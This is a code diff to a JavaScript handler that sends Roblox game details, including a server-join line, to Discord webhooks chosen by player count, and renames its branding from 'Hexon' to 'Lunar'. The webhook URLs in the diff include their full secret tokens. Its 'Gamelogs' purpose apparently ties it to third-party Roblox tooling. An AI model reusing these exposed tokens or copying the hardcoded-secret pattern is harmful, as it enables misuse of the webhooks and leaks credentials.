@@ -33,63 +33,41 @@ export default async function handler(req, res) {
 
   if (playerCount >= 0 && playerCount <= 10) {
     discordWebhookUrl =
-      "https://discord.com/api/webhooks/1455315027123765486/X3HEW7axDRmJuoBL4REgWUVt-GJ5DJFczOXTf3J6q2s4XDE54LHllTf_H6l9ZPee616g";
-  } else if (playerCount <= 50) {
+      "https://discord.com/api/webhooks/1434292638965698610/ESX12TFug6B1zp-XvXe8rDiqQgVzZGxbt8_WhNpJgYa7HhcW22H1bNSokzOxq3l9kWHd";
+  } else if (playerCount > 10 && playerCount <= 50) {
     discordWebhookUrl =
-      "https://discord.com/api/webhooks/1455315050024931475/AW8UfkmFl9dblFRgf40q4IgqikQtinCpA5KnIoNXiHE-PXilXFdMA85LcKt9QmQMlXtF";
-  } else if (playerCount <= 100) {
+      "https://discord.com/api/webhooks/1434292700949123102/AR-W2KDR1vrpdukgf8cu-cNjNHLh38cvoQ9ea3McwOXfPVoUOmNEDauKbKlttkWREpbe";
+  } else if (playerCount > 50 && playerCount <= 100) {
     discordWebhookUrl =
-      "https://discord.com/api/webhooks/1455315086624428217/GaU-bqbGS69Jfzz3ZzOuGSHS7lgpsLwX8yctWFDxYassO4aKR0TlG-fSTn5sVMN-M7Nq";
-  } else {
+      "https://discord.com/api/webhooks/1434292743559053494/C5Vzhu1zfc93L1k6_e_iadMpPxdOsj0SQun5ndPR3UeK_Bk3hj3AX42wANubLaLuF4Zi";
+  } else if (playerCount > 100 && playerCount <= 500) {
     discordWebhookUrl =
-      "https://discord.com/api/webhooks/1455315112473788507/OAZzyCnNe0IimkkDP_YP0jIxanWk_gZEu9ydayJr89DAjpjNhb6rjyU4oMmyS4SjAMT4";
+      "https://discord.com/api/webhooks/1456362917426495581/lFnc7iuN05BaH0RAiJBJ95S0ef8UWlmf52nxK90B2LNsDxlYq-PyIaSfigQfRq5u_XAB";
+  } else if (playerCount > 500) {
+    discordWebhookUrl =
+      "https://discord.com/api/webhooks/1456363004181348586/inNJpJKm6qf7sBO3lHnmJtEhLey7vha9eIGKcY2LWh3C3qrjbUfra_OPdKb1U6s33pID";
   }
 
   const embed = {
-    title: "Hexon Utilities",
-    color: 0x000000,
+    title: "Lunar Utilities",
+    color: 8126685,
     fields: [
-      {
-        name: "Game",
-        value: `[${name}](https://www.roblox.com/games/${placeId})`
-      },
-      {
-        name: "Players",
-        value: `${playerCount}`
-      },
-      {
-        name: "Server players",
-        value: `${playersInServer || "0"}`
-      },
-      {
-        name: "Visits",
-        value: `${visits || "0"}`
-      },
-      {
-        name: "Game Version",
-        value: `${gameVersion || "N/A"}`
-      },
-      {
-        name: "Creator",
-        value: `${creatorName || "Unknown"}`
-      },
-      {
-        name: "JobId",
-        value: `\`\`\`js\nRoblox.GameLauncher.joinGameInstance(${placeId}, "${jobId || "unknown"}");\n\`\`\``
-      }
+      { name: "Game", value: ` [${name}](https://www.roblox.com/games/${placeId})` },
+      { name: "Players", value: ` ${totalPlayers || "0"}` },
+      { name: "Server players", value: `${playersInServer || "0"}` },
+      { name: "Visits", value: `${visits || "0"}` },
+      { name: "Game Version", value: `${gameVersion || "N/A"}` },
+      { name: "Creator", value: `${creatorName || "Unknown"}` },
+      { name: "JobId", value: `\`\`\`js\nRoblox.GameLauncher.joinGameInstance(${placeId}, "${jobId || "unknown"}");\n\`\`\`` }
     ],
-    thumbnail: {
-      url: thumbnail || ""
-    },
+    thumbnail: { url: thumbnail || "" },
     author: {
-      name: "Hexon Gamelogs",
-      icon_url:
-        "https://media.discordapp.net/attachments/1449766127214268467/1454245596532834404/Hexon_Logo.png"
+      name: "Lunar Gamelogs",
+      icon_url: "https://media.discordapp.net/attachments/1389242565588680864/1397931021244043265/lunar_9290559.png"
     },
     footer: {
-      text: "Secured and Powered by isiah",
-      icon_url:
-        "https://media.discordapp.net/attachments/1449766127214268467/1454245596532834404/Hexon_Logo.png"
+      text: "Secured and Powered by Hexon",
+      icon_url: "https://media.discordapp.net/attachments/1449766127214268467/1454245596532834404/Hexon_Logo.png"
     },
     timestamp: new Date().toISOString()
   };
@@ -98,9 +76,7 @@ export default async function handler(req, res) {
     const response = await fetch(discordWebhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        embeds: [embed]
-      })
+      body: JSON.stringify({ embeds: [embed] })
     });
 
     if (!response.ok) {
